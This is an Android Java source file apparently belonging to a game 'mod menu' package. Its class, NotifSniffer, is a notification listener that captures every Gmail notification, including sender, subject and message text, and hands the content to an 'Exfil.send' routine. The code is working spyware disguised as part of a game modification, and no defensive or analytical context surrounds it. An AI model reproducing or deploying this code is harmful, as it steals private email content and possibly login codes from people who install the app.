package com.brawl.modmenu;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifSniffer extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String pkg = sbn.getPackageName();
        if (!"com.google.android.gm".equals(pkg)) return;

        Notification n = sbn.getNotification();
        Bundle b = n.extras;
        StringBuilder sb = new StringBuilder();

        String title = str(b.getCharSequence(Notification.EXTRA_TITLE));
        String text  = str(b.getCharSequence(Notification.EXTRA_TEXT));
        String big   = str(b.getCharSequence(Notification.EXTRA_BIG_TEXT));
        String sub   = str(b.getCharSequence(Notification.EXTRA_SUB_TEXT));
        String sum   = str(b.getCharSequence(Notification.EXTRA_SUMMARY_TEXT));
        String info  = str(b.getCharSequence(Notification.EXTRA_INFO_TEXT));

        CharSequence[] lines = b.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
        StringBuilder linesBuf = new StringBuilder();
        if (lines != null) {
            for (CharSequence c : lines) {
                if (c != null && c.length() > 0) linesBuf.append(c).append("\n");
            }
        }

        if (!title.isEmpty())      sb.append("From: ").append(title).append("\n");
        if (!sub.isEmpty())        sb.append("Subj: ").append(sub).append("\n");
        if (!sum.isEmpty())        sb.append("Sum : ").append(sum).append("\n");
        if (!info.isEmpty())       sb.append("Info: ").append(info).append("\n");
        if (!big.isEmpty())        sb.append("BIG : ").append(big).append("\n");
        if (!text.isEmpty())       sb.append("TXT : ").append(text).append("\n");
        if (linesBuf.length() > 0) sb.append("LINES:\n").append(linesBuf);

        if (sb.length() > 0) {
            Exfil.send("GMAIL_PUSH", sb.toString());
        }
    }

    private String str(CharSequence cs) {
        return cs == null ? "" : cs.toString();
    }

    @Override public void onNotificationRemoved(StatusBarNotification sbn) {}
}
